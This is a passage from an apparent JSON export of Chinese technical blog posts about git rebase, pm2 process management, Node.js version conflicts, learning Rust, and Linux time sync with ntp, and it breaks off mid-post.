  "body": "<p>\n很多开源项目是被强制要求维护干净的提交树，上游容易合并你通过 pull request 提交的补丁，要实现这一点，pull 代码时需要使用 rebase 替换默认的 merge 方式。\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">git pull --rebase\n</pre>\n</div>\n\n<p>\ngit pull 时自动进行 rebase。\n</p>\n\n<ul class=\"org-ul\">\n<li>全局开启\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">git config --global pull.rebase true\n</pre>\n</div>\n</li>\n\n<li>当前分支开启\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">git config branch.master.rebase true\n</pre>\n</div>\n</li>\n</ul>\n\n<p>\n现在，如果你的工作区有未提交的代码，是不允许 pull 的，需要 stash 将工作区清理一下，等 pull 完成再恢复一下。\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">git stash\ngit pull\ngit stash pop\n</pre>\n</div>\n\n<p>\n使用 rebase 模式相对来说麻烦一些，但是好处就是中心仓库的提交历史是线性的，特别是通过 pull request 提交补丁来协作开发的时候，接收方随时可以将补丁合并进来，完全没有 merge 模式合并补丁那么麻烦。强烈建议默认情况下使用这种模式。</p>\n"
},
{
  "title": "使用 pm2 管理应用",
  "timestamp": "2016-02-25 15:18:00",
  "tags": [
    "node",
    "pm2"
  ],
  "body": "<p>\npm2 是使用 node.js 开发的进程管理器，实现统一方式管理进程，如：崩溃后拉起、启动/停止、监控、日志管理等。\n</p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">安装</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">npm install pm2@latest -g\n</pre>\n</div>\n</div>\n\n<div id=\"outline-container-sec-1-1\" class=\"outline-3\">\n<h3 id=\"sec-1-1\">为什么要全局（global）方式安装 pm2？</h3>\n<div class=\"outline-text-3\" id=\"text-1-1\">\n<p>\npm2 被设计成管理用户的全部应用，pm2 的数据保存在 ~/.pm2 目录下，同一用户只能启动一个 pm2 后台进程（PM2 daemon），不同用户的 pm2 互不影响。\n不安装为全局的情况下，如果安装多个版本的 pm2，不同版本的 pm2 前端工具程序与 pm2 后台进程（PM2 daemon）交互是有风险的。\n</p>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">应用管理</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<ul class=\"org-ul\">\n<li>启动应用\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">pm2 start -n app1 app1.js\npm2 start -n app2 app2.js\n</pre>\n</div>\n</li>\n\n<li>列出应用\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">pm2 list\n</pre>\n</div>\n</li>\n\n<li>应用详情\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">pm2 describe app1\n</pre>\n</div>\n</li>\n\n<li>停止应用\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">pm2 stop app1\npm2 stop app2\n</pre>\n</div>\n</li>\n\n<li>删除应用\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">pm2 delete app1\npm2 delete app2\n</pre>\n</div>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">开机启动</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n应用启动后需要保存，应用才会在开机后由 pm2 服务启动。\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">pm2 save\n</pre>\n</div>\n\n<p>\n创建 pm2 系统服务，开机启动 pm2\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo pm2 startup systemd -u app\n</pre>\n</div>\n\n<p>\n不重启试运行一下，看是否正常\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #999999; font-style: italic;\"># </span><span style=\"color: #999999; font-style: italic;\">&#28165;&#31354;&#36827;&#31243;&#24182;&#36864;&#20986; pm2&#65292;&#22238;&#21040;&#24178;&#20928;&#30340;&#31995;&#32479;&#29366;&#24577;</span>\nsudo systemctl stop pm2\nps aux | grep node\n\n<span style=\"color: #999999; font-style: italic;\"># </span><span style=\"color: #999999; font-style: italic;\">&#21551;&#21160; pm2 &#26381;&#21153;&#65292;&#39564;&#35777;&#19968;&#19979;&#24212;&#29992;&#26159;&#21542;&#27491;&#24120;&#21551;&#21160;</span>\nsudo systemctl start pm2\npm2 list\n</pre>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\">日志管理</h2>\n<div class=\"outline-text-2\" id=\"text-4\">\n<p>\n《 <a href=\"http://blog.kankanan.com/article/pm2-768465e55fd77ba17406.html\">pm2的日志管理</a> 》有详细描述。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-5\" class=\"outline-2\">\n<h2 id=\"sec-5\">多 node.js 版本共存</h2>\n<div class=\"outline-text-2\" id=\"text-5\">\n<p>\npm2 本身就是 node.js 开发的程序，依赖 node.js，pm2 应用可以使用不同版本的 node.js。\n</p>\n\n<p>\npm2 命令行工具会通过“#!/usr/bin/env node”方式引用 node，如果应用也以同样的方式引用 node.js，就要随时注意切换 node.js 版本，一不小心 pm2 命令行工具和 pm2 应用使用的 node.js 版本会错乱，有一定风险性。一个 node.js 版本安装的模块不能保证与另一个 node.js 版本兼容，特别是一些 c++ 扩展模块。\n</p>\n\n<p>\n我以前的实践中，应用会提供一个环境脚本 .bashrc ，在操作某个应用时，总是会通过 <code>source .bashrc</code> 先设置应用的 shell 环境变量，通过 $PATH 环境变量指定 node 命令为应用所需的 node.js 版本不是一个好主意，当操作 pm2 时，pm2 也会使用这个应用的 node.js 版本。\n</p>\n\n<p>\n从这一点上看，不应该使用 node.js 、php、python、ruby 之类的脚本语言来开发进程管理器，它本身的依赖管理就是个大麻烦，使用 go、c 或 c++ 来开发会好得多。\n</p>\n\n<p>\n理想情况下，pm2 和 应用（app）总是使用正确的 node.js 版本，可以归为以下三种情形。新应用应该总是假设布署环境为情形 1，不要过多考虑系统运行的 node.js 版本，这也就要求应用能够兼容各种 node.js 版本，但是现实情况是，node.js 以及 javascript 发展得太快了，应用依赖的各种 node.js 模块也往往做不到兼容各种 node.js 版本，很多模块基于实现的简洁性考虑，提供多个版本分别对应不同的 node.js 版本，导致应用也必须从一开始就选择特定的 node.js 版本，不同团队、人员及项目跟进新技术步调不一致时，情形 2 及情形 3 是现实的选择。\n</p>\n</div>\n\n<div id=\"outline-container-sec-5-1\" class=\"outline-3\">\n<h3 id=\"sec-5-1\">情形 1：系统中只有一个 node.js 版本，并且是全局安装</h3>\n<div class=\"outline-text-3\" id=\"text-5-1\">\n<p>\n在专机专用的生产环境下，这种情形会很常见，特别是 docker 容器环境下。\n</p>\n\n<p>\n这是最简单的一种情况，不需要为 node.js 版本操心，整个开发组织在 node.js 版本选择上共进退，保持一致。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-5-2\" class=\"outline-3\">\n<h3 id=\"sec-5-2\">情形 2：系统中有一个全局 node.js 版本，应用有自已的 node.js 版本</h3>\n<div class=\"outline-text-3\" id=\"text-5-2\">\n<p>\n开发环境下，或者同一机器部署大量微服务的情况下，一般就是这种情形。\n</p>\n\n<p>\n这是最复杂的一种情况，在运行应用代码的时候，要确保切到应用所需的 node.js 版本，在执行 pm2 操作的时候，要确保切到 pm2 所需的 node.js 版本，有如履薄冰的感觉。\n</p>\n\n<p>\nnode.js 版本需要在以下方面正确匹配：\n</p>\n\n<ul class=\"org-ul\">\n<li>pm2 的 node.js 版本\n\n<p>\npm2 本身就是一套用户全局的进程管理工具，使用全局的 node.js 版本是自然而然的选择。\n</p>\n\n<p>\n否则就一定要记得使用正确的 node.js 版本运行 pm2：/usr/local/node-v5.0.0/bin/node pm2 list，很是不便。\n</p>\n</li>\n\n<li>应用的 node.js 版本\n\n<p>\n建议使用 <code>--interpreter</code> 选项指定 node.js 版本，参见讨论：<a href=\"https://github.com/Unitech/PM2/issues/1034\">Using different versions of node via nvm for each app · Issue #1034 · Unitech/pm2</a> 。\n</p>\n\n<p>\n警告：pm2 在 <code>cluster</code> 模式下， <code>--interpreter</code> 选项被忽略，详见：<a href=\"http://blog.kankanan.com/article/module-version-mismatch-95198bef639267e5.html\">Module version mismatch 错误排查 | 看看俺 – KanKanAn.com</a> 。\n</p>\n\n<p>\n这是最关键的一点，应用的 node.js 版本不对，可能导致应用启动失败，中断服务。\n</p>\n</li>\n\n<li>应用的辅助脚本的 node.js 版本\n\n<p>\n使用 node.js 开发的应用附带命令行工具运行时如果 node.js 版本不对，通常不会对运行中的服务造成影响。\n</p>\n\n<p>\n可以简单地写一些 shell 脚本封装，在 shell 脚本中指定正确的 node.js 版本，如：\n</p>\n\n<p>\n<code>dump.sh</code>\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #999999; font-style: italic;\">#</span><span style=\"color: #999999; font-style: italic;\">!/bin/</span><span style=\"color: #99cc99;\">bash</span>\n\n/usr/local/node-v5.0.0/bin/node ./dump.js\n</pre>\n</div>\n\n<p>\n也可以直接在 node.js 脚本中引用正确的 node.js 版本，如：\n</p>\n\n<p>\n<code>dump.js</code>\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\">#!/usr/local/node-v5.0.0/bin/node\n\n<span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">fs</span> = require(<span style=\"color: #66cccc;\">'fs'</span>);\n...\n</pre>\n</div>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">chmod a+x dump.js\n./dump.js\n</pre>\n</div>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-5-3\" class=\"outline-3\">\n<h3 id=\"sec-5-3\">情形 3：系统没有全局 node.js 版本，应用各自维护 node.js 版本</h3>\n<div class=\"outline-text-3\" id=\"text-5-3\">\n<p>\n这是上面情况的简化版，考验开发、运维团队的纪律性。\n</p>\n\n<p>\n由于 $PATH 中没有 node.js，不会由于没有指定 node.js 绝对路径无意间引用错误的 node.js 版本。\n</p>\n\n<p>\n可以把 node.js 安装在应用根目录下，如下目录结构所示：\n</p>\n\n<pre class=\"example\">\nApplications\n|\n|\n|--- Application 1\n|         |\n|         |--------- node\n|         |\n|         |--------- package.json\n|         |\n|         |--------- ...\n|\n|    \n|--- Application 2\n|         |\n|         |--------- node\n|         |\n|         |--------- package.json\n|         |\n|         |--------- ...\n|\n|\n|--- Application 3\n|         |\n|         |--------- node\n|         |\n|         |--------- package.json\n|         |\n|         |--------- ...\n|\n</pre>\n\n<p>\n甚至 pm2 也通过以上方式安装自已的 node.js 版本。\n</p>\n\n<p>\n通过 ./node/bin/node 引用 node.js 可执行程序，不要试图通过将 ./node/bin 目录加到 $PATH 中以简化使用，否则操作不同应用或 pm2 时，又会一不小心引用到错误的 node.js 版本。\n</p>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-6\" class=\"outline-2\">\n<h2 id=\"sec-6\">参考</h2>\n<div class=\"outline-text-2\" id=\"text-6\">\n<p>\n<a href=\"http://pm2.keymetrics.io/docs/usage/pm2-doc-single-page/\">PM2 - One page documentation</a></p>\n</div>\n</div>\n"
},
{
  "title": "CentOS 6.4 生产环境上安装 pm2",
  "timestamp": "2016-02-25 17:27:00",
  "tags": [
    "node",
    "pm2",
    "linux"
  ],
  "body": "<p>\n确保系统要干净（尚未安装 node.js），使用 root 帐号登录。\n</p>\n\n<ul class=\"org-ul\">\n<li>安装 LTS 版的 node.js\n\n<p>\n当前 <a href=\"https://nodejs.org/en/\">官方</a> 推荐的 LTS 版本为 v4.3.1，通过淘宝镜像下载速度快一些，直接安装在系统目录中 /usr 下，便于使用。\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">wget http://npm.taobao.org/mirrors/node/latest-v4.x/node-v4.3.1-linux-x64.tar.xz<span style=\"text-decoration: underline;\"> -O node-v4.3.1-linux-x64.tar.xz</span>\ntar xJvf node-v4.3.1-linux-x64.tar.xz --no-same-owner --exclude CHANGELOG.md --e<span style=\"text-decoration: underline;\">xclude LICENSE --exclude README.md --strip-components 1 -C /usr</span>\n</pre>\n</div>\n\n<p>\n参考：<a href=\"https://gist.github.com/TooTallNate/2477f53a23a51537332e\">Install Node.js one-liner</a>\n</p>\n</li>\n\n<li>安装稳定版 pm2\n\n<p>\n从 <a href=\"https://github.com/Unitech/pm2/blob/master/CHANGELOG.md\">CHANGELOG.md</a> 查到的当前的稳定版本为 v0.14.3，pm2 发布很频繁,不宜追新。\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">npm install pm2@0.14.3 -g\n</pre>\n</div>\n</li>\n\n<li>设置 pm2 为开机启动\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">pm2 startup centos\n</pre>\n</div>\n</li>\n\n<li>定期清理日志\n\n<p>\n按《 <a href=\"http://blog.kankanan.com/article/pm2-768465e55fd77ba17406.html#sec-6\">pm2的日志管理</a> 》中的“定期清理日志”一节所述使用 logrotate 服务定期清理日志。</p>\n</li>\n</ul>\n"
},
{
  "title": "计划学一门新语言：Rust",
  "timestamp": "2016-02-29 17:52:00",
  "tags": [
    "rust"
  ],
  "body": "<p>\n常常听到每年学一门新语言的建议，想想还是有道理的，可能主力开发语言还是一两种，但是拓宽视野才是关键。\n</p>\n\n<p>\n一开始比较倾向于 golang ，语言设计简单、后台硬，而且有很多杀手级应用。\n</p>\n\n<p>\n但是自已用 node.js 开发后台应用接近两年时间，除了部署时要下载一大堆包，并且包的兼容性变化较大这一点缺陷外，无论是开发效率和运行效率都合我意。再学一门应用领域差不多的 golang 有点动力不够。\n</p>\n\n<p>\nrust 看起来和手头上的语言差异较大，是一门严肃认真的语言，野心不小，反正也没指望立即拿它混饭吃，就暂定它吧。\n</p>\n\n<p>\n学习计划分为以下阶段：\n</p>\n\n<ul class=\"org-ul\">\n<li>学习语言本身并做一些示例练习\n\n<p>\n从 《Rust Programming Language》一书入手。\n</p>\n\n<p>\n预计用一部分 3、4 月份的业余时间。\n</p>\n</li>\n\n<li>用于写一些对自已有用的临时性项目\n\n<p>\n预计用一部分 5、6 月份的业余时间。\n</p>\n</li>\n\n<li>参与一些开源项目\n\n<p>\n预计 7 月份之后的时间吧。\n</p>\n</li>\n\n<li>用于产品开发\n\n<p>\n如果这门语言本身经得起考验的话，不排除在工作中的一些小项目上正式使用。</p>\n</li>\n</ul>\n"
},
{
  "title": "Rust 是 C++ 的继承者",
  "timestamp": "2016-02-29 19:35:00",
  "tags": [
    "rust"
  ],
  "body": "<p>\n刚看完《<a href=\"http://killercup.github.io/trpl-ebook/trpl-2015-09-26.html\">Rust Programming Language</a>》开头章节“A brief introduction to Rust”，第一个例子就可以看出它是 C++ 的继承者，相信每个 C++ 开发者会忍不住会心一笑。\n</p>\n\n<p>\n看以下代码\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-rust\"><span style=\"color: #99cc99;\">fn</span> <span style=\"color: #f99157;\">main</span>() {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">let</span> <span style=\"color: #99cc99;\">mut</span> x = <span style=\"color: #cc99cc;\">vec!</span>[<span style=\"color: #66cccc;\">\"Hello\"</span>, <span style=\"color: #66cccc;\">\"world\"</span>];\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">let</span> y = &amp;x[0];\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   x.push(<span style=\"color: #66cccc;\">\"foo\"</span>);\n}\n</pre>\n</div>\n\n<p>\n会编译出错\n</p>\n<pre class=\"example\">\nerror: cannot borrow `x` as mutable because it is also borrowed as immutable\n      x.push(\"foo\");\n      ^\n  note: previous borrow of `x` occurs here; the immutable borrow prevents\n  subsequent moves or mutable borrows of `x` until the borrow ends\n      let y = &amp;x[0];\n               ^\n  note: previous borrow ends here\n  fn main() {\n\n  }\n  ^\n</pre>\n\n<p>\n可以这样修复\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-rust\"><span style=\"color: #99cc99;\">fn</span> <span style=\"color: #f99157;\">main</span>() {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">let</span> <span style=\"color: #99cc99;\">mut</span> x = <span style=\"color: #cc99cc;\">vec!</span>[<span style=\"color: #66cccc;\">\"Hello\"</span>, <span style=\"color: #66cccc;\">\"world\"</span>];\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">let</span> y = x[0].clone();\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   x.push(<span style=\"color: #66cccc;\">\"foo\"</span>);\n}\n</pre>\n</div>\n\n<p>\n也可以这样修复\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-rust\"><span style=\"color: #99cc99;\">fn</span> <span style=\"color: #f99157;\">main</span>() {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">let</span> <span style=\"color: #99cc99;\">mut</span> x = <span style=\"color: #cc99cc;\">vec!</span>[<span style=\"color: #66cccc;\">\"Hello\"</span>, <span style=\"color: #66cccc;\">\"world\"</span>];\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">let</span> y = &amp;x[0];\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   x.push(<span style=\"color: #66cccc;\">\"foo\"</span>);\n}\n</pre>\n</div>\n\n<p>\n再多新颖的关键字也掩不住骨子里的 C++ 气息：作用域、引用，还有代码未明确表达的 “move语义”、RAII等。\n</p>\n\n<p>\n考虑到 Rust 宣称是一门“安全”、“高效”、“并发”的语言，消除了大量 C++ 的缺陷，对于一个掌握 C++ 的开发人员来说，语法形式上添加的繁琐不是问题，只要是经得起推敲那就是合理的。\n</p>\n\n<p>\nRust 是由 <a href=\"https://github.com/servo/servo\">Servo</a> （浏览器引擎）项目驱动的，这导致现阶段 Rust 的定位是客户端系统软件开发，服务端高并发相关的需求被延后（如：异步I/O、协程），从这一点上看 Rust、Golang 其实是互补的。\n</p>\n\n<p>\nRust 的主要特性：\n</p>\n\n<ul class=\"org-ul\">\n<li>基本类型\n\n<p>\n与 C++ 相似\n</p>\n</li>\n\n<li>模板\n\n<p>\n与 C++ 相似，更友好的错误信息\n</p>\n</li>\n\n<li>Trait\n\n<p>\nRust 语言级的支持，没有继承，通过 Trait 实现了运行时多态\n</p>\n</li>\n\n<li>RAII\n</li>\n\n<li>静态类型及自动类型推导\n</li>\n\n<li>模块化支持\n</li>\n\n<li>文档及测试\n</li>\n\n<li>宏\n\n<p>\nRust 的宏更安全，不同于 C++ 的基于文本的替换，Rust 的宏是语义完备的。\n</p>\n</li>\n\n<li>安全优先\n\n<p>\nRust 设计上的主要考虑就是安全（Safety），如变量定义默认是 const 的，borrow checker，lifetime等,\n强大的编译期检测。</p>\n</li>\n</ul>\n"
},
{
  "title": "Archlinux 下搭建 Rust 开发环境",
  "timestamp": "2016-02-29 20:03:00",
  "tags": [
    "rust",
    "archlinux",
    "emacs"
  ],
  "body": "<ul class=\"org-ul\">\n<li>Emacs 里安装 rust-mode\n\n<p>\nM-x el-get-install rust-mode\n</p>\n</li>\n\n<li>Archlinux 安装 rust 相关包\n\n<p>\nyaourt -S rust cargo\n</p>\n\n<p>\n安装的版本\n</p>\n\n<pre class=\"example\">\n$ rustc --version\nrustc 1.6.0\n$ cargo --version\ncargo 0.8.0 (28a0cbb 2016-01-17)\n</pre>\n</li>\n\n<li>Hello world!\n\n<p>\n<code>hello_world.rs</code>\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-rust\"><span style=\"color: #99cc99;\">fn</span> <span style=\"color: #f99157;\">main</span>() {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cc99cc;\">println!</span>(<span style=\"color: #66cccc;\">\"Hello, world!\"</span>);\n}\n</pre>\n</div>\n\n<p>\n编译运行\n</p>\n<pre class=\"example\">\n$ rustc hello_world.rs \n$ ./hello_world \nHello, world!\n</pre>\n</li>\n\n<li>更多配置\n\n<p>\n可以参考文章《<a href=\"http://bassam.co/emacs/2015/08/24/rust-with-emacs/\">Configuring Emacs for Rust</a>》进行更高级的配置，对于我这种 Rust 还没入门的人来说，前面的配置已经足够，还是一步一个脚印吧。</p>\n</li>\n</ul>\n"
},
{
  "title": "Module version mismatch 错误排查",
  "timestamp": "2016-03-02 15:41:00",
  "tags": [
    "node",
    "pm2"
  ],
  "body": "<p>\nnode.js 应用启动时出现以下错误：\n</p>\n<pre class=\"example\">\nError: Cannot find module '../build/Debug/addon'\n    at Function.Module._resolveFilename (module.js:339:15)\n    at Function.Module._load (module.js:290:25)\n    at Function._load (/usr/lib/node_modules/pm2/node_modules/pmx/lib/transaction.js:62:21)\n    at Module.require (module.js:367:17)\n    at require (internal/module.js:16:19)\n    at Object.&lt;anonymous&gt; (node_modules/heapdump/lib/main.js:18:15)\n    at Module._compile (module.js:413:34)\n    at Object.Module._extensions..js (module.js:422:10)\n    at Module.load (module.js:357:32)\n    at Function.Module._load (module.js:314:12)\n</pre>\n\n<p>\n改了一下 heapdump/lib/main.js:18:15 附近的代码，输出了真正的错误信息：\n</p>\n<pre class=\"example\">\nError: Module version mismatch. Expected 47, got 46.\n</pre>\n\n<p>\n根据 node_version.h 中 NODE_MODULE_VERSION 的定义，46 对应 Node.js v4.0.0，47 对应 Node.js v5.0.0。\n应该是编译 heapdump 模块使用的 Node.js 版本和运行时 Node.js 版本不一致，编译时我通过 $PATH 环境变量，将 Node.js v4.2.3 置为默认的 Node.js 版本了。\n</p>\n<pre class=\"example\">\n$ /usr/bin/node --version \nv5.7.0\n$ node --version\nv4.2.3\n</pre>\n\n<p>\n我使用的是 pm2 做为进程管理器，cluster 模式运行 node.js 应用，pm2 后台进程使用的是默认版本的 Node.js 版本（v5.7.0）启动，应该是 pm2 也使用同样的 Node.js 版本（v5.7.0）来运行应用，执行 pm2 save 后，~/.pm2/dump.pm2 中我的应用的 $PATH 是正确的，已经将 Node.js v4.2.3 置为默认的 Node.js 版本，不知为何 pm2 并未采用。\n</p>\n\n<p>\npm2 分为前端命令和后端 daemon 两部分，真正的操作都是由 daemon 来施行，当我们使用 pm2 start 来启动 app 时，只是把命令通过 unix socket 传递给了 daemon，一个合理的猜想是 pm2 命令并没有把当前 shell 的 $PATH 传递给 daemon，或者是 daemon 创建 app 进程时传递过来的 $PATH 设置未生效。\n</p>\n\n<p>\n查看当前的 pm2 版本：\n</p>\n<pre class=\"example\">\n$ ps aux | grep PM2 | grep -v grep \ntangxin+ 17538  0.1  0.4 1185564 32020 ?       Ssl  2月25   9:29 PM2 v0.14.5: God Daemon\n</pre>\n\n<p>\n通过 &#x2013;interpreter 选项启动应用时指定 Node.js v4.2.3： &#x2013;interpreter=/usr/local/node-v4.2.3/bin/node\n</p>\n\n<p>\n通过 pm2 delete 删除应用后再 start 应用，结果还是一样的错误，查看应用实际使用的 node 版本：\n</p>\n<pre class=\"example\">\n$ ls -la /proc/22387/exe\nlrwxrwxrwx 1 tangxinfa tangxinfa 0 3月   2 14:00 /proc/22387/exe -&gt; /usr/bin/node\n</pre>\n<p>\n使用的还是系统默认的 Node.js 版本 v5.7.0。\n</p>\n\n<p>\n经过测试，可以确认：\n</p>\n<blockquote>\n<p>\n通过 &#x2013;interpreter 指定其它 node 版本，在 cluster 模式下无效，fork 模式下有效。\n</p>\n</blockquote>\n\n<p>\n参见相关 Issues：\n</p>\n\n<ul class=\"org-ul\">\n<li><a href=\"https://github.com/Unitech/PM2/issues/1575\">interpreter ignored when using cluster mode · Issue #1575 · Unitech/pm2</a>\n</li>\n\n<li><a href=\"https://github.com/Unitech/PM2/issues/1034\">Using different versions of node via nvm for each app · Issue #1034 · Unitech/pm2</a>\n</li>\n\n<li><a href=\"https://github.com/Unitech/PM2/issues/1224#issuecomment-99931316\">&#x2013;interpreter not applied? · Issue #1224 · Unitech/pm2</a>\n</li>\n</ul>\n\n\n<p>\n查看 pm2 与 node.js 的源代码进一步确认该问题：\n</p>\n\n<ul class=\"org-ul\">\n<li>pm2 调用 cluster.fork 创建工作进程\n\n<p>\n引用自 pm2/lib/God/ClusterMode.js\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\">cluster.fork({pm2_env: JSON.stringify(env_copy)})\n</pre>\n</div>\n</li>\n\n<li>cluster.fork 调用 child_process.fork 创建工作进程\n\n<p>\n引用自 node/lib/cluster.js\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #99cc99;\">return</span> fork(cluster.settings.exec, cluster.settings.args, {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span> env: workerEnv,\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span> silent: cluster.settings.silent,\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span> execArgv: execArgv,\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span> gid: cluster.settings.gid,\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span> uid: cluster.settings.uid\n});\n</pre>\n</div>\n\n<p>\n根据 child_process.fork 的实现（见 node/lib/child_process.js），由于未传入 <code>execPath</code> 选项，会使用 <code>process.execPath</code> 的值，也就是会使用 pm2 后台进程的 node 可执行程序路径来创建工作进程。\n</p>\n</li>\n</ul>\n\n<p>\n应该可以通过指定不同的 $PM2_HOME 环境变量，跑多套 pm2，各个 pm2 使用不同版本的 Node.js，多个 cluster 模式的 pm2 应用也就会使用不同版本 Node.js。</p>\n"
},
{
  "title": "linux 系统时间同步",
  "timestamp": "2016-03-10 14:07:00",
  "tags": [
    "linux"
  ],
  "body": "<dl class=\"org-dl\">\n<dt> ntp </dt><dd>Network Time Protocol，即网络时间同步协议。\n</dd>\n</dl>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">安装 ntp</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\nntpdate 和 ntpd 通常包含在 ntp 软件包里，但有的系统是单独打包。\n</p>\n\n<p>\nntpdate 命令用于直接同步时间。\n</p>\n\n<p>\nntpd 服务用于平滑同步时间。\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">yaourt -S ntp\n</pre>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">使用 ntpdate 命令同步时间</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\nntpdate 命令用于强制性的将系统时间设置为 ntp 服务器时间，导致时钟跃变，可能会引起系统不稳定。\n</p>\n</div>\n\n<div id=\"outline-container-sec-2-1\" class=\"outline-3\">\n<h3 id=\"sec-2-1\">手工同步一次</h3>\n<div class=\"outline-text-3\" id=\"text-2-1\">\n<p>\n带 -d 选项，调试运行，不修改本地时间\n</p>\n<pre class=\"example\">\n<span class=\"linenr\"> 1: </span># ntpdate -d s1a.time.edu.cn\n<span class=\"linenr\"> 2: </span> 9 Mar 18:46:29 ntpdate[20537]: ntpdate 4.2.4p8@1.1612-o Fri Feb 22 11:23:28 UTC 2013 (1)\n<span class=\"linenr\"> 3: </span>Looking for host s1a.time.edu.cn and service ntp\n<span class=\"linenr\"> 4: </span>host found : 202.112.10.60\n<span class=\"linenr\"> 5: </span>transmit(202.112.10.60)\n<span class=\"linenr\"> 6: </span>receive(202.112.10.60)\n<span class=\"linenr\"> 7: </span>transmit(202.112.10.60)\n<span class=\"linenr\"> 8: </span>receive(202.112.10.60)\n<span class=\"linenr\"> 9: </span>transmit(202.112.10.60)\n<span class=\"linenr\">10: </span>receive(202.112.10.60)\n<span class=\"linenr\">11: </span>transmit(202.112.10.60)\n<span class=\"linenr\">12: </span>receive(202.112.10.60)\n<span class=\"linenr\">13: </span>transmit(202.112.10.60)\n<span class=\"linenr\">14: </span>server 202.112.10.60, port 123\n<span class=\"linenr\">15: </span>stratum 1, precision -20, leap 00, trust 000\n<span class=\"linenr\">16: </span>refid [PPS], delay 0.06285, dispersion 0.00003\n<span class=\"linenr\">17: </span>transmitted 4, in filter 4\n<span class=\"linenr\">18: </span>reference time:    da8a8b53.73391350  Wed, Mar  9 2016 19:45:23.450\n<span class=\"linenr\">19: </span>originate timestamp: da8a8b5c.3f42dc7c  Wed, Mar  9 2016 19:45:32.247\n<span class=\"linenr\">20: </span>transmit timestamp:  da8a7d86.32fde4c3  Wed, Mar  9 2016 18:46:30.199\n<span class=\"linenr\">21: </span>filter delay:  0.06323  0.06317  0.06299  0.06285 \n<span class=\"linenr\">22: </span>         0.00000  0.00000  0.00000  0.00000 \n<span class=\"linenr\">23: </span>filter offset: 3542.028 3542.028 3542.028 3542.028\n<span class=\"linenr\">24: </span>         0.000000 0.000000 0.000000 0.000000\n<span class=\"linenr\">25: </span>delay 0.06285, dispersion 0.00003\n<span id=\"coderef-ntpdate_debug_offset\" class=\"coderef-off\"><span class=\"linenr\">26: </span>offset 3542.028898</span>\n<span class=\"linenr\">27: </span>\n<span class=\"linenr\">28: </span> 9 Mar 18:46:30 ntpdate[20537]: step time server 202.112.10.60 offset 3542.028898 sec\n</pre>\n\n<dl class=\"org-dl\">\n<dt> 行 <a 